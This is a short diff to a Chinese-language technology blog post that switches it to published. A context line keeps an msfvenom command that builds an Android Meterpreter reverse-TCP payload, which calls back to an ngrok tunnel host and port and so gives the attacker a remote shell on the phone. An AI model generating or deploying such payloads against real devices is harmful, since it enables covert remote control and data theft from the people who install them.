@@ -1,5 +1,5 @@
 ---
-published: false
+published: true
 layout: post
 categories: 技术
 ---
@@ -16,5 +16,3 @@ msfvenom -p android/meterpreter/reverse_tcp lhost=4.tcp.ngrok.io lport=16715 R >
 ```
 
 生成
-
-
